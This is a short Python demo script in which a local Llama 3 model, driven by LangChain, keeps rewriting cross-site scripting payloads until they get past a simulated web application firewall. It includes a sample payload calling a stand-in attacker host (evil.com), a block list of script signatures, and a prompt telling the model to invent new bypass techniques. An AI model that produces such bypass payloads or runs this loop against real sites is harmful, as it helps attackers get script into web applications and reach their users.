from langchain_community.llms import Ollama
from langchain.prompts import PromptTemplate

print("Waking up the AI Agent...")
llm = Ollama(model="llama3")

# 1. Simulate a Web Application Firewall (WAF)
def simulate_target_waf(payload):
    print(f"\n[->] Firing Payload: {payload}")
    
    # Very basic WAF rules that block obvious scripts
    forbidden_signatures = ["<script>", "alert(", "document.cookie"]
    
    for sig in forbidden_signatures:
        if sig in payload.lower():
            return False, f"403 Forbidden: Blocked by WAF rule matching '{sig}'"
            
    # If it bypasses the rules, it succeeds
    if "fetch(" in payload or "img src=x" in payload.lower():
        return True, "200 OK: Execution successful. Check server logs."
        
    return False, "200 OK: Payload reflected safely. No execution."

# 2. The Mutator/Critic Prompt

mutator_template = """
You are an expert bug bounty hunter trying to bypass a Web Application Firewall (WAF). 
The WAF explicitly blocked this payload: {current_payload}
Because of this error: {waf_error}

CRITICAL INSTRUCTIONS:
1. DO NOT include the original blocked payload in your response.
2. DO NOT use the exact strings that caused the block.
3. Write a COMPLETELY NEW payload using a different technique.
4. Output ONLY the raw, newly mutated payload string. No markdown, no quotes, no explanations.

New Payload:
"""

# Create the prompt object
mutator_prompt = PromptTemplate(
    input_variables=["current_payload", "waf_error"],
    template=mutator_template
)

# 3. The Autonomous Execution Loop
def run_agent_loop(initial_payload, max_attempts=4):
    current_payload = initial_payload
    
    for attempt in range(1, max_attempts + 1):
        print(f"\n--- Attempt {attempt} of {max_attempts} ---")
        
        # Fire the payload at the dummy WAF
        success, waf_response = simulate_target_waf(current_payload)
        print(f"[<-] Server Response: {waf_response}")
        
        if success:
            print("\n[+] SUCCESS! The AI Agent successfully bypassed the WAF.")
            break
            
        if attempt == max_attempts:
            print("\n[-] FAILED. Agent exhausted all attempts.")
            break
            
        # If it failed, feed the error back to the AI to mutate the payload
        print("[!] WAF triggered. Asking AI to analyze and mutate...")
        formatted_prompt = mutator_prompt.format(
            current_payload=current_payload, 
            waf_error=waf_response
        )
        
        # Get the new payload from the AI and strip any accidental whitespace
        current_payload = llm.invoke(formatted_prompt).strip()

# 4. Kick off the hunt
starting_payload = "<script>fetch('http://evil.com/log')</script>"
run_agent_loop(starting_payload)
